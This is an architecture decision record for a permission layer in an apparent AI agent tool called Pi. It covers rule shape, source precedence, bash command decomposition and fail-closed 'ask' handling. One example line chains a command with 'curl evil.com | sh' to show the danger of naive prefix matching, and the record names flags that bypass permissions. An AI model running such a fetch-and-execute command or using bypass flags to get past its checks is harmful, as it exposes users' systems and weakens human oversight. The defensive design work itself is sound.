# ADR 0004 — Permission rule model and source precedence

**Status:** Accepted · **Date:** 2026-08-11

Phase 2a adds the authorization layer Pi has never had. ADR 0010 already settled that
a tool declares its own `ruleContent` grammar and that the engine holds no
tool-specific matching. What remains, and what this ADR settles, is the shape of a
rule, the order in which conflicting rules resolve, and what a rule is allowed to
mean. Phase 4's roughly fifteen tools declare grammars against these answers, so they
stop being cheap to change almost immediately.

**A permission rule is `{source, behavior, toolName, ruleContent?}` where `behavior`
is `allow | deny | ask`; conflicts resolve by source precedence
`policy > flag > local > project > user > cliArg > command > session`, highest
matching rule wins; and a rule may only authorize what its tool can prove it
authorizes.**

Four properties are the decision.

**The highest-precedence *matching* rule wins, whatever its behavior.** `deny` does
not automatically outrank `allow`. The cheaper alternative — deny-always-wins — reads
safer and is worse: it makes a broad organizational `deny` impossible to narrow, so
the only way to do local work is to disable the layer wholesale. Precedence must
therefore be tested at each of the eight levels rather than spot-checked, because
"safety" is no longer a shortcut that covers a mistake in the order.

**`flag` outranks config; `cliArg` does not.** Both arrive on the command line, which
makes the split look arbitrary until the two are named. `flag` is a deliberate
per-run security override — `--permission-mode`, `--dangerously-skip-permissions` —
and an operator who types one has made a decision that project config should not
silently reverse. `cliArg` is per-invocation convenience (`--allowedTools read,grep`)
and is a *default*, so it sits below the files a team maintains. Without this
distinction the order is unreadable and will be re-argued; with it, each of the eight
levels has a stated reason to sit where it does.

**A rule may only authorize what its tool can prove it authorizes.** For path-shaped
tools this is unremarkable. For `bash` it is the whole security question, because a
shell command chains: `git commit -m x && curl evil.com | sh` would be authorized by
a naive prefix match on rule content `git commit:*`. `bash` therefore decomposes a
command on shell operators and requires **every** resulting segment to match an allow
rule, and anything its tokenizer cannot confidently parse — command substitution,
backticks, constructs it does not model — resolves to `ask`, never `allow`. The
cheaper alternative, prefix matching, does not fail loudly; it grants authority the
user believed was scoped and reports success. An adversarial bypass corpus ships with
the grammar rather than after it.

**`ask` fails closed, and a session that cannot ask refuses to start.** With no
interactive responder — headless, RPC, CI — an `ask` resolves to `deny`. That alone
produces a bad failure: an agent that burns a full run discovering it cannot write
anything, with denials that look like a bug. So a non-interactive session started
with no explicit `--permission-mode` exits at startup naming the valid modes. The
fail-closed behavior remains underneath as the backstop; the startup check exists so
it is rarely the thing a user meets.

Consequences accepted. The precedence order costs an eight-level conflict test that
must be maintained as sources change, and the bash grammar costs materially more than
prefix matching — a tokenizer, a fail-closed classification, and an adversarial
corpus. Both are paid because the alternative is an authorization layer whose
guarantees are weaker than what users will reasonably read into it, which is the
failure Pi's own security documentation warns about for sandboxes and which applies
identically here. `bypassPermissions` remains available and documented; it is an
explicit choice, never an implicit fallback.
